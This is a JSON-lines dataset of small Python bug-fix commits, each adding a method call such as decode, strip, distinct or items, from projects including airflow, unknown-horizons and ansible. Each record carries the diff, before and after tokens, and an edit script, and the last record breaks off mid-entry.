{"project": "airflow", "commit_sha": "5184c6e2f108d3db15205ad806e6529b5e0b4259", "parent_sha": "15f1abef288411539b512f6bdb572c4a54aa5447", "file_path": "airflow/task_runner/base_task_runner.py", "project_url": "https://github.com/costrouc/airflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ class BaseTaskRunner(LoggingMixin):\n \n     def _read_task_logs(self, stream):\n         while True:\n-            line = stream.readline()\n+            line = stream.readline().decode('utf-8')\n             if len(line) == 0:\n                 break\n             self.logger.info('Subtask: {}'.format(line.rstrip('\\n')))\n", "before": "line = stream . readline ( )", "after": "line = stream . readline ( ) . decode ( 'utf-8' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 20, 3, 37], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 20, 3, 37], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 37], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "spotlib", "commit_sha": "e9aa56ee27b3e041c18b5eddef9a57c19a84cd35", "parent_sha": "526413a7cb908a33761f393739f730c1590a773d", "file_path": "scripts/config.py", "project_url": "https://github.com/fstab50/spotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ def package_name(artifact):\n         f2 = f1.readlines()\n     for line in f2:\n         if line.startswith('PACKAGE'):\n-            return line.split(':')[1]\n+            return line.split(':')[1].strip()\n     return None\n \n \n", "before": "return line . split ( ':' ) [ 1 ]", "after": "return line . split ( ':' ) [ 1 ] . strip ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 38], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 20, 3, 38], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:strip\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "honeybee-radiance-command", "commit_sha": "a9680c6dfd7096e7834f126dccc7814b577f12c2", "parent_sha": "babf240e69787bd76ad9fa49a568e366a62ae82a", "file_path": "honeybee_radiance_command/_command.py", "project_url": "https://github.com/ladybug-tools/honeybee-radiance-command", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ class Command(object):\n-        cmd = self.to_radiance()\n+        cmd = self.to_radiance().replace('\\\\', '/')\n         rc = run_command(cmd, env, cwd)\n         self.after_run()\n         return rc\n", "before": "cmd = self . to_radiance ( )", "after": "cmd = self . to_radiance ( ) . replace ( '\\\\' , '/' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 0, 15, 0, 33], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 0, 15, 0, 33], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 0, 15, 0, 33], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'\\\\\\\\'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'/'\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "dolo", "commit_sha": "8ef1ca179fd1a740d7f05b77759ff152fb537e0e", "parent_sha": "869d941b5f98a82830ba94997132f6c33fa630e5", "file_path": "src/dolo/misc/matlab.py", "project_url": "https://github.com/TomAugspurger/dolo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ def value_to_mat(v):\n     elif isinstance(v,sympy.Matrix):\n         return '[%s]' %v.__repr__().replace('\\n',';').replace(',',' ')\n     elif str(v.__class__) == \"<type 'numpy.ndarray'>\":\n-        return str(v).replace('\\n','')\n+        return str(v).replace('\\n','').replace('] [',' ; ')\n         #raise Warning('list conversion to matlab not implemented (will be soon)')\n     else:\n         return \"'%s'\" %str(v)\n", "before": "return str ( v ) . replace ( '\\n' , '' )", "after": "return str ( v ) . replace ( '\\n' , '' ) . replace ( '] [' , ' ; ' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 39], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 39], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 39], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'] ['\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:' ; '\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "unknown-horizons", "commit_sha": "1d665265141c77d161105944c4233d52651b3cc4", "parent_sha": "b081d5d4e72a37ecb65cd2d27bb66b3d6b8bdbfa", "file_path": "horizons/gui/keylisteners/ingamekeylistener.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class IngameKeyListener(fife.IKeyListener, LivingObject):\n \t\t\tif self.session.selected_instances:\n \t\t\t\t# scroll to first one, we can never guarantee to display all selected units\n \t\t\t\tinstance = iter(self.session.selected_instances).next()\n-\t\t\t\tself.session.view.center( * instance.position.to_tuple())\n+\t\t\t\tself.session.view.center( * instance.position.center().to_tuple())\n \t\t\t\tfor instance in self.session.selected_instances:\n \t\t\t\t\tif hasattr(instance, \"path\") and instance.owner.is_local_player:\n \t\t\t\t\t\tself.session.ingame_gui.minimap.show_unit_path(instance)\n", "before": "self . session . view . center ( * instance . position . to_tuple ( ) )", "after": "self . session . view . center ( * instance . position . center ( ) . to_tuple ( ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 33, 3, 59], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 33, 3, 59], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 33, 3, 50], 0], [\"Move\", \"N1\", [\".:.\", 3, 50, 3, 51], 1], [\"Insert\", \"N1\", [\"identifier:center\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "unknown-horizons", "commit_sha": "0d937dddae8142232e275716eff0eb8b53d6cc57", "parent_sha": "4e04cfff74dab9b0236e1c6fd4d119086483e3b9", "file_path": "horizons/world/building/production.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -184,7 +184,7 @@ class Mine(SelectableBuilding, ProducerBuilding, BuildableSingleOnDeposit, Basic\n \n \tdef remove(self):\n \t\t# build the deposit back here after remove() is finished\n-\t\tdeposit_build_data = { 'inventory' : self.inventory.get_dump() }\n+\t\tdeposit_build_data = { 'inventory' : self.get_component(StorageComponent).inventory.get_dump() }\n \t\tbuild_cmd = Build(self.__deposit_class, self.position.origin.x, self.position.origin.y, \\\n \t\t                  self.island, ownerless=True, data = deposit_build_data)\n \t\tScheduler().add_new_object(build_cmd, build_cmd, run_in=0)\n", "before": "deposit_build_data = { 'inventory' : self . inventory . get_dump ( ) }", "after": "deposit_build_data = { 'inventory' : self . get_component ( StorageComponent ) . inventory . get_dump ( ) }", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 40, 3, 54], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 40, 3, 54], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"identifier:self\", 3, 40, 3, 44], 0], [\"Move\", \"N1\", [\".:.\", 3, 44, 3, 45], 1], [\"Insert\", \"N1\", [\"identifier:get_component\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:StorageComponent\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "21f351e96da0e50e84620a7356a7ddecf95adadc", "parent_sha": "a5acfe0bd75c6b2d179185648fecca6c546ca9c5", "file_path": "horizons/gui/widgets/playersships.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -87,7 +87,7 @@ class PlayersShips(StatsWidget):\n \t\tweapons = Label(name='weapons_%d' % ship.worldid)\n \t\tif isinstance(ship, FightingShip):\n \t\t\tweapon_list = []\n-\t\t\tfor weapon_id, amount in sorted(ship.get_weapon_storage()):\n+\t\t\tfor weapon_id, amount in sorted(ship.get_weapon_storage().itercontents()):\n \t\t\t\tweapon_list.append('%d %s' % (amount, self.session.db.get_res_name(weapon_id)))\n \t\t\tif weapon_list:\n \t\t\t\tweapons.text = u', '.join(weapon_list)\n", "before": "for weapon_id , amount in sorted ( ship . get_weapon_storage ( ) ) : weapon_list . append ( '%d %s' % ( amount , self . session . db . get_res_name ( weapon_id ) ) )", "after": "for weapon_id , amount in sorted ( ship . get_weapon_storage ( ) . itercontents ( ) ) : weapon_list . append ( '%d %s' % ( amount , self . session . db . get_res_name ( weapon_id ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 36, 3, 59], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 36, 3, 59], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 36, 3, 59], [\"identifier:itercontents\", \"T\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 36, 3, 59], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "unknown-horizons", "commit_sha": "815983ff71b8533802c2791ba80e29b85e86a5b0", "parent_sha": "fed9da8bb9e87b6ed15d6e7c797d71d31416ce9a", "file_path": "horizons/world/traderoute.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -121,7 +121,7 @@ class TradeRoute(object):\n \n \t\t\t\t\t# the ship should never pick up more than the number defined in the route config\n \t\t\t\t\tif self.ship.get_component(StorageComponent).inventory[res] + amount > self.get_location()['resource_list'][res]:\n-\t\t\t\t\t\tamount = self.get_location()['resource_list'][res] - self.ship.inventory[res]\n+\t\t\t\t\t\tamount = self.get_location()['resource_list'][res] - self.ship.get_component(StorageComponent).inventory[res]\n \n \t\t\t\t\t# check if ship has enough space is handled implicitly below\n \t\t\t\t\tamount_transferred = settlement.transfer_to_storageholder(amount, res, self.ship)\n", "before": "amount = self . get_location ( ) [ 'resource_list' ] [ res ] - self . ship . inventory [ res ]", "after": "amount = self . get_location ( ) [ 'resource_list' ] [ res ] - self . ship . get_component ( StorageComponent ) . inventory [ res ]", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"attribute\", 3, 60, 3, 79], [\"call\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 60, 3, 79], [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 60, 3, 69], 0], [\"Move\", \"N1\", [\".:.\", 3, 69, 3, 70], 1], [\"Insert\", \"N1\", [\"identifier:get_component\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:StorageComponent\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "d83091bafef478728ec802f7eca0a647a4c57af8", "parent_sha": "c4cd895b57a669e4bc7c4b1c0a604537150b955d", "file_path": "horizons/gui/gui.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -592,7 +592,7 @@ class Gui(SingleplayerMenu, MultiplayerMenu):\n \t\t\t\t#xgettext:python-format\n \t\t\t\tdetails_label.text += _(\"Saved at {time}\").format(\n \t\t\t\t                         time=time.strftime(\"%c\",\n-\t\t\t\t                         time.localtime(savegame_info['timestamp'])))\n+\t\t\t\t                         time.localtime(savegame_info['timestamp'])).decode('utf-8'))\n \t\t\tdetails_label.text += u'\\n'\n \t\t\tcounter = savegame_info['savecounter']\n \t\t\t# N_ takes care of plural forms for different languages\n", "before": "details_label . text += _ ( \"Saved at {time}\" ) . format ( time = time . strftime ( \"%c\" , time . localtime ( savegame_info [ 'timestamp' ] ) ) )", "after": "details_label . text += _ ( \"Saved at {time}\" ) . format ( time = time . strftime ( \"%c\" , time . localtime ( savegame_info [ 'timestamp' ] ) ) . decode ( 'utf-8' ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 2, 35, 3, 73], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 2, 35, 3, 73], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 2, 35, 3, 73], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'utf-8'\", \"T\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "gapi_scripts", "commit_sha": "a1f2cb4fa0aeec5233d69d15c4ac7f60ab793175", "parent_sha": "dd8cd3b3e36a616df8412742a4aabc7489465ca2", "file_path": "print_todays_agenda.py", "project_url": "https://github.com/ddboline/gapi_scripts", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ def print_todays_agenda():\n                 continue\n             elif e.event_time > datetime.datetime.now(tzobj):\n                 outstr.append(e.print_event())\n-        return '\\n'.join(outstr)\n+        return ('\\n'.join(outstr)).encode(errors='ignore')\n \n     cachefile = '/tmp/.todays_agenda.tmp'\n     def convert_time_date(st):\n", "before": "return '\\n' . join ( outstr )", "after": "return ( '\\n' . join ( outstr ) ) . encode ( errors = 'ignore' )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 33], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 33], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N2\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:encode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"keyword_argument\", \"N3\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"call\", 3, 16, 3, 33], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:errors\", \"T\"], 0], [\"Insert\", \"N3\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N3\", [\"string:'ignore'\", \"T\"], 2]]"}
{"project": "urbanradder", "commit_sha": "f7df31016d8606714eb01d9031a2cc17ad67cdb2", "parent_sha": "6c11988249d38c1992f208f98a6dd1ceb2d727b4", "file_path": "saleor/graphql/api.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -123,7 +123,7 @@ class CategoryType(DjangoObjectType):\n \n         tree = self.get_descendants(include_self=True)\n         qs = products_for_api(context.user)\n-        qs = qs.filter(categories__in=tree)\n+        qs = qs.filter(categories__in=tree).distinct()\n         attributes_filter = args.get('attributes')\n         order_by = args.get('order_by')\n         price_lte = args.get('price_lte')\n", "before": "qs = qs . filter ( categories__in = tree )", "after": "qs = qs . filter ( categories__in = tree ) . distinct ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 14, 3, 44], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 14, 3, 44], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 14, 3, 44], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:distinct\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "urbanradder", "commit_sha": "b18f33ed8cf590ea9976e809d71d6090f25463ea", "parent_sha": "73acb67fcc38ba43cbbc7993d986d68629722858", "file_path": "tests/dashboard/test_product.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -152,7 +152,7 @@ def test_view_product_toggle_publish(db, admin_client, product_in_stock):\n     response = admin_client.post(url)\n     assert response.status_code == 200\n     data = {'success': True, 'is_published': False}\n-    assert json.loads(response.content) == data\n+    assert json.loads(response.content.decode('utf8')) == data\n     admin_client.post(url)\n     product.refresh_from_db()\n     assert product.is_published\n", "before": "assert json . loads ( response . content ) == data", "after": "assert json . loads ( response . content . decode ( 'utf8' ) ) == data", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 22, 3, 40], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 22, 3, 40], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"attribute\", 3, 23, 3, 39], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'utf8'\", \"T\"], 1], [\"Move\", \"N2\", [\"):)\", 3, 39, 3, 40], 2]]"}
{"project": "descqa", "commit_sha": "7fa3b22cb1b6623768259d14dc26bdb5f285c71f", "parent_sha": "268b834aa9a295e8913d0332aae3a9b1c5c12222", "file_path": "master.py", "project_url": "https://github.com/vvinuv/descqa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -367,7 +367,7 @@ def main(args):\n         master_status['comment'] = args.comment\n     master_status['versions'] = dict()\n \n-    git_hash = subprocess.check_output(['git', 'rev-parse', '--verify', '--short', 'HEAD'])\n+    git_hash = subprocess.check_output(['git', 'rev-parse', '--verify', '--short', 'HEAD']).decode()\n     version_records = record_version('DESCQA', git_hash, master_status['versions'], logger=log)\n \n     make_argpath_absolute(args)\n", "before": "git_hash = subprocess . check_output ( [ 'git' , 'rev-parse' , '--verify' , '--short' , 'HEAD' ] )", "after": "git_hash = subprocess . check_output ( [ 'git' , 'rev-parse' , '--verify' , '--short' , 'HEAD' ] ) . decode ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 16, 3, 92], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 16, 3, 92], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 92], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:decode\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "descqa", "commit_sha": "15e7d28169d863dc6dcf0f1c5226489e024a7520", "parent_sha": "ff382120debc40aee4cfbbfcc2635619816b94c8", "file_path": "www/descqaweb/matrix.py", "project_url": "https://github.com/vvinuv/descqa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def prepare_matrix(run=None, catalog_prefix=None, test_prefix=None):\n     data['run'] = descqa_run.name\n     data['comment'] = descqa_run.status.get('comment', '')\n     data['user'] = descqa_run.status.get('user', 'UNKNOWN')\n-    data['versions'] = ' | '.join(('{}: {}'.format(k, v) for k, v in descqa_run.status.get('versions', dict())))\n+    data['versions'] = ' | '.join(('{}: {}'.format(k, v) for k, v in descqa_run.status.get('versions', dict()).items()))\n \n     if 'start_time' in descqa_run.status:\n         data['start_time'] = time.strftime('at %Y/%m/%d %H:%M:%S PT', time.localtime(descqa_run.status.get('start_time')))\n", "before": "data [ 'versions' ] = ' | ' . join ( ( '{}: {}' . format ( k , v ) for k , v in descqa_run . status . get ( 'versions' , dict ( ) ) ) )", "after": "data [ 'versions' ] = ' | ' . join ( ( '{}: {}' . format ( k , v ) for k , v in descqa_run . status . get ( 'versions' , dict ( ) ) . items ( ) ) )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 70, 3, 111], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 70, 3, 111], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 70, 3, 111], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:items\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "unknown-horizons", "commit_sha": "0ac01e0c8925ad7dfc4718c3ed0a120275dcb34e", "parent_sha": "00d136a59f7177570c1ebe28c05e91134e18a8fb", "file_path": "horizons/gui/keylisteners/ingamekeylistener.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ class IngameKeyListener(fife.IKeyListener, LivingObject):\n \t\t\t\t\tinstance.get_component(SelectableComponent).deselect()\n \t\t\t\tfor instance in self.session.selection_groups[num] - self.session.selected_instances:\n \t\t\t\t\tinstance.get_component(SelectableComponent).select(reset_cam=True)\n-\t\t\t\tself.session.selected_instances = self.session.selection_groups[num]\n+\t\t\t\tself.session.selected_instances = self.session.selection_groups[num].copy()\n \t\telif action == _Actions.QUICKSAVE:\n \t\t\tself.session.quicksave() # load is only handled by the MainListener\n \t\telif action == _Actions.SAVE_MAP:\n", "before": "self . session . selected_instances = self . session . selection_groups [ num ]", "after": "self . session . selected_instances = self . session . selection_groups [ num ] . copy ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 73], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 39, 3, 73], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:copy\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"):)\", \"T\"], 1]]"}
{"project": "autotest-", "commit_sha": "506353bf88a302dbc3d749ffbc1d328ef9554b17", "parent_sha": "b8153b536565caa7f960752c700c5f4a9ba4419d", "file_path": "frontend/afe/models.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -236,7 +236,7 @@ class ModelExtensions(object):\n \t\tquery_dict = {}\n \t\tfor field, value in filter_data.iteritems():\n \t\t\tquery_dict[field] = value\n-\t\tquery = cls.objects.filter(**query_dict)\n+\t\tquery = cls.objects.filter(**query_dict).distinct()\n \t\tif extra_args:\n \t\t\tquery = query.extra(**extra_args)\n \t\tassert isinstance(sort_by, list) or isinstance(sort_by, tuple)\n", "before": "query = cls . objects . filter ( ** query_dict )", "after": "query = cls . objects . filter ( ** query_dict ) . distinct ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 3, 11, 3, 43], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 11, 3, 43], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 3, 11, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:distinct\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"):)\", \"T\"], 1]]"}
{"project": "autotest-", "commit_sha": "f753d2827781cf42dd19bf895205f3c818ed439e", "parent_sha": "bc534ca8fbffd27ced77d0f5f437f359ab8bccd9", "file_path": "installation_support/autotest_firewalld_add_service_unittest.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ def load_module_from_file(module_file_path):\n     module_file = open(module_file_path, py_source_open_mode)\n     try:\n         new_module = imp.load_module(\n-            os.path.splitext(filename)[0],\n+            os.path.splitext(filename)[0].replace(\"-\", \"_\"),\n             module_file, module_file_path, py_source_description)\n     finally:\n         module_file.close()\n", "before": "new_module = imp . load_module ( os . path . splitext ( filename ) [ 0 ] , module_file , module_file_path , py_source_description )", "after": "new_module = imp . load_module ( os . path . splitext ( filename ) [ 0 ] . replace ( \"-\" , \"_\" ) , module_file , module_file_path , py_source_description )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 37, 4, 66], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 2, 37, 4, 66], [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Move\", \"N1\", [\"subscript\", 3, 13, 3, 42], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:\\\"-\\\"\", \"T\"], 1], [\"Move\", \"N2\", [\",:,\", 3, 42, 3, 43], 2], [\"Insert\", \"N2\", [\"string:\\\"_\\\"\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-1", "commit_sha": "1a0fbd424e3e02e5c81da1d5a7fc78d6fb710c14", "parent_sha": "e8c599b0f7c1cfabcfc6bb952ad0a1306a138ea7", "file_path": "lib/ansible/module_utils/vmware.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -669,7 +669,7 @@ def set_vm_power_state(content, vm, state, force):\n     facts = gather_vm_facts(content, vm)\n-    expected_state = state.replace('_', '').lower()\n+    expected_state = state.replace('_', '').replace('-', '').lower()\n     current_state = facts['hw_power_status'].lower()\n     result = dict(\n         changed=False,\n", "before": "expected_state = state . replace ( '_' , '' ) . lower ( )", "after": "expected_state = state . replace ( '_' , '' ) . replace ( '-' , '' ) . lower ( )", "sstub_pattern": "ADD_METHOD_CALL", "edit_script": "[[\"Insert\", [\"call\", 1, 22, 1, 44], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 1, 22, 1, 44], [\"argument_list\", \"N1\"], 1], [\"Move\", \"N0\", [\"call\", 1, 22, 1, 44], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:replace\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'-'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:''\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "ansible-1", "commit_sha": "65feaa11b2f8bbea92092284434bf2e1ccbc224c", "parent_sha": "10467efaba968c49ae24d25d8c113442efac62ea", "file_path": "contrib/inventory/vmware_inventory.py", "project_url": "https://github.com/drewp/ansible-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -745,7 +745,7 @@ class VMWareInventory(object):\n             return self.inventory['_meta']['hostvars'][host]\n         elif self.args.host and self.inventory['_meta']['hostvars']:\n             match = None\n-            for k, v in self.inventory['_meta']['hostvars']:\n+            for k, v in self.inventory['_meta']['hostvars'].items():\n                 if self.inventory['_meta']['hostvars'][k]['name'] == self.args.host:\n                     match = k\n                     break\n", "before": "for k , v in self . inventory [ '_meta' ] [ 'hostvars' ] : if self . inventory [ '_meta' ] [ 'hostvars' ] [ k ] [ 'name' ] == self . args . host : match = k break", "after": "for k , v in self . inventory [ '_meta' ] [ 'hostvars' ] . items ( ) : if self . inventory [ 